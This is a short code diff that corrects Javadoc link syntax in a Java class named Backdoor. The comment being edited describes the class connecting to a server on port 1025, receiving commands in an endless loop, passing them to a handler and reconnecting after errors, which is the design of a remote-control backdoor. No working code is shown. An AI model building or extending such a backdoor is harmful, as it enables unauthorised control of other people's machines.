@@ -43,7 +43,7 @@ public class Backdoor {
 	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
 	 * initiates {@link in} and {@link out} and starts infinite loop that gets
 	 * command from server with {@link in} and handles command with
-	 * {@link HandleCommand.handle(String command)}. If exception is thrown,
+	 * {@link HandleCommand#handle(String command)}. If exception is thrown,
 	 * {@link socket}, {@link in}, and {@link out} are closed and {@link #start()}
 	 * is run.
 	 */
